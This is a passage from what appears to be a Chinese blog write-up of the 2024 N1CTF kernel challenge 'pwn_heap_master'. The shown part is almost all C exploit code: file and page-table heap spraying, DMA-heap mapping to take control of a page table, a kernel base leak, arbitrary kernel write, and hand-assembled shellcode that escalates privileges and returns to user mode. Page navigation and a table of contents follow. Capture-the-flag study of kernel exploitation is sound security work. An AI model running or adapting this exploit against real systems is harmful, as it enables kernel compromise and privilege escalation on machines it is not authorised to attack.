i++)&#123;<br>        file_fd[i] = open(<span class="hljs-string">&quot;/&quot;</span>, O_RDONLY);<br>        <span class="hljs-keyword">if</span>(file_fd[i] == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Error open file&quot;</span>);<br>    &#125;<br>    k_free(free_idx);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SPRAY_FILE_NUM; i++)&#123;<br>        tmp_file_fd[i] = open(<span class="hljs-string">&quot;/bin/busybox&quot;</span>, O_RDONLY);<br>        <span class="hljs-keyword">if</span>(tmp_file_fd[i] == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Error open tmp file&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SPRAY_FILE_NUM; i++)&#123;<br>        <span class="hljs-type">int</span> tmp_int = read(file_fd[i], buffer, <span class="hljs-number">0x100</span>);<br>        <span class="hljs-keyword">if</span>(tmp_int != <span class="hljs-number">-1</span>)&#123;<br>            victim_idx = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Found victim idx: %d\n&quot;</span>, i);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] step3 free all file and spray pagetable, dma-heap&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SPRAY_FILE_NUM; i++)&#123;<br>        close(tmp_file_fd[i]);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SPRAY_FILE_NUM; i++)&#123;<br>        <span class="hljs-keyword">if</span>(victim_idx == i) <span class="hljs-keyword">continue</span>;<br>        close(file_fd[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SPRAY_PGTABLE_NUM/<span class="hljs-number">2</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++)&#123;<br>            spray_page[i][j*<span class="hljs-number">0x1000</span>/<span class="hljs-number">8</span>] = i+j;<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_heap_allocation_data</span> <span class="hljs-title">data</span>;</span><br>    data.len = <span class="hljs-number">0x1000</span>;<br>    data.fd_flags = O_RDWR;<br>    data.heap_flags = <span class="hljs-number">0</span>;<br>    data.fd = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] DMA_HEAP_IOCTL_ALLOC&quot;</span>);<br>    &#125;<br>    <span class="hljs-type">int</span> dma_buf_fd = data.fd;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = SPRAY_PGTABLE_NUM/<span class="hljs-number">2</span>; i &lt; SPRAY_PGTABLE_NUM; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++)&#123;<br>            spray_page[i][j*<span class="hljs-number">0x1000</span>/<span class="hljs-number">8</span>] = i+j;<br>        &#125;<br>    &#125;<br>    getchar();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] step4 dup fd and find victim page&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt; <span class="hljs-number">0x1000</span>; i++)&#123;<br>        dup(file_fd[victim_idx]);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SPRAY_PGTABLE_NUM/<span class="hljs-number">2</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++)&#123;<br><br>            <span class="hljs-keyword">if</span>(spray_page[i][j*<span class="hljs-number">0x1000</span>/<span class="hljs-number">8</span>] != (ull)(i+j))&#123;<br>                victim_page = &amp;spray_page[i][j*<span class="hljs-number">0x1000</span>/<span class="hljs-number">8</span>];<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Found victim page %llx\n&quot;</span>, victim_page);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(victim_page != (ull*)<span class="hljs-number">-1</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    getchar();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] step5 munmap victim page and dma-heap mmap victim page addr&quot;</span>);<br>    munmap(victim_page, <span class="hljs-number">0x1000</span>);<br>    ull* dmabuf = mmap((<span class="hljs-type">void</span> *)victim_page, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE,<br>                    MAP_SHARED, dma_buf_fd, <span class="hljs-number">0</span>);<br>    dmabuf[<span class="hljs-number">0</span>] = <span class="hljs-number">0x114514</span>;<br>    <span class="hljs-keyword">for</span>(;;)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt; <span class="hljs-number">0x1000</span>; i++)&#123;<br>            dup(file_fd[victim_idx]);<br>        &#125;<br>        <span class="hljs-keyword">if</span>((victim_page[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x867</span>)&#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] success control pagetable&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] step6 search victim page and leak kbase&quot;</span>);<br>    dmabuf[<span class="hljs-number">0</span>] = <span class="hljs-number">0x800000000009c867</span>;<br>    victim_page = (ull*)<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = SPRAY_PGTABLE_NUM/<span class="hljs-number">2</span>; i &lt; SPRAY_PGTABLE_NUM; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>((spray_page[i][j*<span class="hljs-number">0x1000</span>/<span class="hljs-number">8</span>] &amp; <span class="hljs-number">0xff00</span>) == <span class="hljs-number">0x4000</span>)&#123;<br>                victim_page = &amp;spray_page[i][j*<span class="hljs-number">0x1000</span>/<span class="hljs-number">8</span>];<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Found victim page %llx\n&quot;</span>, victim_page);<br>                kbase = (spray_page[i][j*<span class="hljs-number">0x1000</span>/<span class="hljs-number">8</span>] &amp; ~<span class="hljs-number">0xff</span>) - <span class="hljs-number">0x3a04000</span>;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] get kbase %llx\n&quot;</span>, kbase);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(victim_page != (ull*)<span class="hljs-number">-1</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] step7 arbitraty write and read&quot;</span>);<br>    ull link_addr = <span class="hljs-number">0x42cc40</span> + kbase;<br>    dmabuf[<span class="hljs-number">0</span>] = <span class="hljs-number">0x8000000000000867</span> | (link_addr &amp; ~<span class="hljs-number">0xfff</span>);<br>    <span class="hljs-type">char</span> shellcode[] = &#123;<span class="hljs-number">0xf3</span>,<span class="hljs-number">0x0f</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0xfa</span>,<span class="hljs-number">0xe8</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xef</span>,<br>        <span class="hljs-number">0x49</span>,<span class="hljs-number">0xcc</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x8d</span>,<span class="hljs-number">0xbf</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x6b</span>,<span class="hljs-number">0xa7</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x8d</span>,<span class="hljs-number">0x87</span>,<br>        <span class="hljs-number">0x70</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x1c</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0xbf</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x8d</span>,<span class="hljs-number">0x87</span>,<br>        <span class="hljs-number">0xa0</span>,<span class="hljs-number">0x8f</span>,<span class="hljs-number">0x1b</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0xc7</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x8d</span>,<span class="hljs-number">0xb7</span>,<span class="hljs-number">0xc0</span>,<span class="hljs-number">0x68</span>,<br>        <span class="hljs-number">0xa7</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x8d</span>,<span class="hljs-number">0x87</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0x0a</span>,<span class="hljs-number">0x1c</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x8d</span>,<span class="hljs-number">0xbf</span>,<br>        <span class="hljs-number">0x20</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0xbb</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x8d</span>,<span class="hljs-number">0x87</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-number">0xc0</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0x48</span>,<br>        <span class="hljs-number">0x89</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0xbf</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x8d</span>,<br>        <span class="hljs-number">0x87</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-number">0x8f</span>,<span class="hljs-number">0x1b</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x98</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x31</span>,<span class="hljs-number">0xc0</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0x22</span>,<br>        <span class="hljs-number">0x22</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0xb8</span>,<br>        <span class="hljs-number">0x33</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x18</span>,<span class="hljs-number">0x48</span>,<br>        <span class="hljs-number">0xb8</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x20</span>,<br>        <span class="hljs-number">0x48</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x24</span>,<br>        <span class="hljs-number">0x28</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x44</span>,<br>        <span class="hljs-number">0x24</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x8d</span>,<span class="hljs-number">0x87</span>,<span class="hljs-number">0xc6</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xe0</span>,<span class="hljs-number">0xcc</span>&#125;;<br>    ull* p;<br>    p = memmem(shellcode, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-string">&quot;\x11\x11\x11\x11\x11\x11\x11\x11&quot;</span>, <span class="hljs-number">8</span>);<br>    p[<span class="hljs-number">0</span>] = getpid();<br>    p = memmem(shellcode, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-string">&quot;\x22\x22\x22\x22\x22\x22\x22\x22&quot;</span>, <span class="hljs-number">8</span>);<br>    p[<span class="hljs-number">0</span>] = (ull)&amp;win;<br>    p = memmem(shellcode, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-string">&quot;\x33\x33\x33\x33\x33\x33\x33\x33&quot;</span>, <span class="hljs-number">8</span>);<br>    p[<span class="hljs-number">0</span>] = user_cs;<br>    p = memmem(shellcode, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-string">&quot;\x44\x44\x44\x44\x44\x44\x44\x44&quot;</span>, <span class="hljs-number">8</span>);<br>    p[<span class="hljs-number">0</span>] = user_rflags;<br>    p = memmem(shellcode, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-string">&quot;\x55\x55\x55\x55\x55\x55\x55\x55&quot;</span>, <span class="hljs-number">8</span>);<br>    p[<span class="hljs-number">0</span>] = user_sp;<br>    p = memmem(shellcode, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-string">&quot;\x66\x66\x66\x66\x66\x66\x66\x66&quot;</span>, <span class="hljs-number">8</span>);<br>    p[<span class="hljs-number">0</span>] = user_ss;<br>    <span class="hljs-built_in">memcpy</span>(victim_page+(link_addr &amp; <span class="hljs-number">0xfff</span>)/<span class="hljs-number">8</span>, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br>    <span class="hljs-keyword">if</span> (prctl(PR_SET_NAME, <span class="hljs-string">&quot;WHAT_CAN_I_SAY!&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] prctl error&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, symlink(<span class="hljs-string">&quot;/exp&quot;</span>, <span class="hljs-string">&quot;/tmp/exp&quot;</span>));<br>    getchar();<br>    <br>&#125;<br></code></pre></td></tr></table></figure>

<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/09/30/strtab%E5%8A%AB%E6%8C%81-2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-easyblind/">[strtab劫持] 2024巅峰极客 easyblind Prev →</a></div></div></div><div id="comments"><div id="valine"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/kfc0.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.XDLiu</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#2024-N1CTF-pwn-heap-master"><span class="toc-number">1.</span> <span class="toc-text">2024 N1CTF pwn_heap_master</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">前置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EDirty-PageTable"><span class="toc-number">1.2.</span> <span class="toc-text">关于Dirty PageTable</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E9%A2%98%E7%9B%AE"><span class="toc-number">1.3.</span> <span class="toc-text">分析题目</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%85%8D%E7%BD%AE"><span class="toc-number">1.3.1.</span> <span class="toc-text">题目配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E9%A9%B1%E5%8A%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">目标驱动</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A5%9E%E7%A7%98%E6%93%8D%E4%BD%9C"><span class="toc-number">1.3.3.</span> <span class="toc-text">神秘操作</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5"><span class="toc-number">1.4.1.</span> <span class="toc-text">第一步</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5"><span class="toc-number">1.4.2.</span> <span class="toc-text">第二步</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5"><span class="toc-number">1.4.3.</span> <span class="toc-text">第三步</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5"><span class="toc-number">1.4.4.</span> <span class="toc-text">第四步</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5"><span class="toc-number">1.4.5.</span> <span class="toc-text">第五步</span></a></li></ol></li></ol></li></ol></div></div><footer></footer></aside><!--    nobr #{__('footer.publish')}   a(href= 'http://hexo.io') Hexo
wbr
nobr  Theme 
  a(href= 'https://github.com/Yue-plus/hexo-theme-arknights') Arknights
wbr
nobr  by 
  a(href= 'https://github.com/Yue-plus') Yue_plus--></main></body></html>